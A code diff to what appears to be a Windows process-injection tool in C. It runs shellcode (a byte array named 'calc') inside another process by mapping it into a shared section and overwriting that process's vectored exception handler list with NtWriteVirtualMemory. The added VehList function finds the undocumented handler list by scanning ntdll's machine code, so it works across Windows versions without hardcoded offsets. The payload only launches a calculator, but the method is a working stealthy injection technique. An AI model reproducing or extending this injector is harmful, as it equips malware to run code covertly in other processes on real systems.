@@ -2,7 +2,7 @@
 #pragma warning (disable : 4047)
 #pragma warning (disable : 4024)
 
-extern PVOID GetBase(BOOL* bWin10);
+extern PVOID GetBase();
 
 unsigned char calc[] = {
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
@@ -122,7 +122,7 @@ _End:
 	if (pFree)
 		HeapFree(GetProcessHeap(), 0, pFree); pFree = NULL;
 
-	if ( (*hTarget == NULL) || (*dwTarget == 0) ) {
+	if ((*hTarget == NULL) || (*dwTarget == 0)) {
 		return FALSE;
 	}
 	else {
@@ -136,7 +136,7 @@ BOOL RemoteMap(HANDLE hTarget, PVOID* pRemoteBuffer) {
 	PVOID pLocal = NULL;
 	PVOID pRemote = NULL;
 	HANDLE hSection = NULL;
-	SIZE_T szPayload = sizeof(calc); 
+	SIZE_T szPayload = sizeof(calc);
 	SIZE_T szViewSize = NULL;
 
 	LARGE_INTEGER li = { .HighPart = 0, .LowPart = szPayload };
@@ -204,8 +204,8 @@ BOOL OverWriteRemoteVeh(PVOID pVehList, PVOID pMappedMemory, HANDLE hTarget) {
 	DWORD		dwOld = 0;
 
 	VECTORED_HANDLER_LIST	handler_list = { 0 };
-	VEH_HANDLER_ENTRY		handler_entry = { 0 };
-	SIZE_T					szPointer = sizeof(handler_entry.VectoredHandler1);
+	VEH_HANDLER_ENTRY	handler_entry = { 0 };
+	SIZE_T			szPointer = sizeof(handler_entry.VectoredHandler1);
 
 	if ((STATUS = g_Nt.pNtReadVirtualMemory(hTarget, pVehList, &handler_list, sizeof(handler_list), NULL)) != STATUS_SUCCESS) {
 		printf("[!] NtReadVirtualMemory failed: 0x%0.8X\n", STATUS);
@@ -235,7 +235,7 @@ BOOL OverWriteRemoteVeh(PVOID pVehList, PVOID pMappedMemory, HANDLE hTarget) {
 		printf("[!] VirtualProtectEx failed: %ld\n", GetLastError());
 		return FALSE;
 	}
-	
+
 	if ((STATUS = g_Nt.pNtWriteVirtualMemory(hTarget, pointer_offset, &handler_entry.VectoredHandler1, szPointer, NULL)) != STATUS_SUCCESS) {
 		printf("[!] NtWriteVirtualMemory failed: 0x%0.8X\n", STATUS);
 		return FALSE;
@@ -250,6 +250,57 @@ BOOL OverWriteRemoteVeh(PVOID pVehList, PVOID pMappedMemory, HANDLE hTarget) {
 	return TRUE;
 }
 
+PVOID VehList() {
+
+	int	offset = 0;
+	int	i = 1;
+	PBYTE	pNext = NULL;
+	PBYTE	pRtlpAddVectoredHandler = NULL;
+	PBYTE	pVehList = NULL;
+
+
+	PBYTE pRtlAddVectoredExceptionHandler = (PBYTE)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "RtlAddVectoredExceptionHandler");
+	printf("[*] RtlAddVectoredExceptionHandler: 0x%p\n", pRtlAddVectoredExceptionHandler);
+
+	while (*pRtlAddVectoredExceptionHandler != 0xcc) {
+
+		if (*pRtlAddVectoredExceptionHandler == 0xe9) {
+
+			pNext = pRtlAddVectoredExceptionHandler + 5;
+			offset = *(int*)(pRtlAddVectoredExceptionHandler + 1);
+			pRtlpAddVectoredHandler = (ULONG_PTR)pNext + offset;
+			break;
+		}
+
+		pRtlAddVectoredExceptionHandler++;
+	}
+
+	if (!pRtlpAddVectoredHandler)
+		return NULL;
+
+	printf("[*] RtlpAddVectoredHandler: 0x%p\n", pRtlpAddVectoredHandler);
+
+	while (TRUE) {
+
+		if ((*pRtlpAddVectoredHandler == 0x48) && (*(pRtlpAddVectoredHandler + 1) == 0x8d) && (*(pRtlpAddVectoredHandler + 2) == 0x0d)) {
+
+			if (i == 2) {
+				offset = *(int*)(pRtlpAddVectoredHandler + 3);
+				pNext = (ULONG_PTR)pRtlpAddVectoredHandler + 7;
+				pVehList = pNext + offset;
+				return (PVOID)pVehList;
+			}
+			else {
+				i++;
+			}
+		}
+
+		pRtlpAddVectoredHandler++;
+	}
+
+	return NULL;
+}
+
 VOID main() {
 
 	DWORD	dwEdge = 0;
@@ -258,17 +309,14 @@ VOID main() {
 	HANDLE	hSection = NULL;
 	PVOID	pRemoteMappedBuffer = NULL;
 	PVOID	pLocalMappedBuffer = NULL;
-	PVOID	pVehList = NULL;
 
-	PVOID	ntdll = GetBase(&bWin10);
+	PVOID	ntdll = GetBase();
+	PVOID	pVehList = VehList();
 
-	//Peak C programming
-	if (bWin10) {
-		pVehList = (ULONG_PTR)ntdll + VEH_LIST_OFFSET_WIN10;
-	}
-	else {
-		pVehList = (ULONG_PTR)ntdll + VEH_LIST_OFFSET_WIN11;
-	}
+	if (!pVehList)
+		return;
+
+	printf("[*] Vehlist: 0x%p\n", pVehList);
 
 	//Some extra API-s in this
 	if (!InitNtApis(ntdll, &g_Nt))
